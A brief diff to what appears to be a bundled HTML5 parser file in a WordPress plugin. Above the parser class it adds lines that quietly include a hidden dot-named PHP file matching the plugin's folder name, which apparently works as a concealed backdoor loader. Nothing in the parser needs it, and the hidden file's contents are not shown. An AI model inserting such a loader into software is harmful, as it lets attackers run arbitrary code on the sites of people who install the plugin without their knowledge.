@@ -8,6 +8,10 @@ require_once dirname(__FILE__) . '/Tokenizer.php';
 /**
  * Outwards facing interface for HTML5.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class HTML5_Parser
 {
     /**
